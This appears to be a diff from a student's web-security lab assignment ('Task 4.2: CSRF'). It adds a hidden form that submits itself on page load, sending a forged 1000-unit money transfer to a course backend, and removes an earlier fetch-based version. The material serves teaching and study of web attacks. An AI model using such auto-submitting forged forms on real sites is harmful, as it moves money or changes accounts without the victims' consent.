@@ -2,8 +2,23 @@
 <head>
     <title>Task 4.2: CSRF</title>
 </head>
-<body>
-    <form method="post" id="Attack_Form">
+<body onload="document.getElementById('attack-form').submit()">
+    <form
+      id="attack-form"
+      method="POST"
+      action="https://cse543.websecurity.ngrok.pizza/backend/tfourtwo"
+      style="display: none"
+    >
+      <input type="hidden" name="username" value="skp6318" />
+
+      <input type="hidden" name="fname" value="Attack_Surya" />
+
+      <input type="hidden" name="amount" value="1000" />
+      <input type="hidden" name="comment" value="CSRF Attack" />
+
+      <input type="hidden" name="dataForm" value="" />
+    </form>
+    <form method="post" id="benign-form">
         <div class="question-container">
             <p>Transfer Money (Authenticated Users)</p>
             <input type="hidden" name="username" value="skp6318"/>
@@ -20,20 +35,4 @@
         </div>
     </form>
 </body>
-<script>
-    document.getElementById('Attack_Form').addEventListener('submit', function(event) {
-    event.preventDefault();
-
-    const formData = new FormData(this);
-
-    formData.set('fname', 'Attack_Surya');
-
-    fetch('https://cse543.websecurity.ngrok.pizza/backend/tfourtwo', {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.json())
-    .then(data => console.log(data))
-});
-</script>
 </html>
